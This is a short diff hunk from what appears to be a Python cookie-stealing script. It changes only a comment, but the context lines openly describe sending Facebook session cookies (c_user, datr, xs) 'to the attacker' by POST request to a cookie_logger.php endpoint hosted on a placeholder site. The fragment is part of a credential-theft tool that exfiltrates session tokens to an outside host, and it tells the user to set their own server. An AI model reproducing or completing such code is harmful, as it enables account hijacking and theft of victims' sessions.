@@ -71,7 +71,7 @@ conn.close()
 xs=str(xs)
 
 #sending the cookie data to the attacker using POST request.
-#enter your website here in the url field.
+#edit the url and place your website name where you have hosted your cookie_logger.php script
 
 url = 'http://your-website.com/cookie_logger.php'
 payload = {'c_user': c_user, 'datr': datr,'xs': xs}
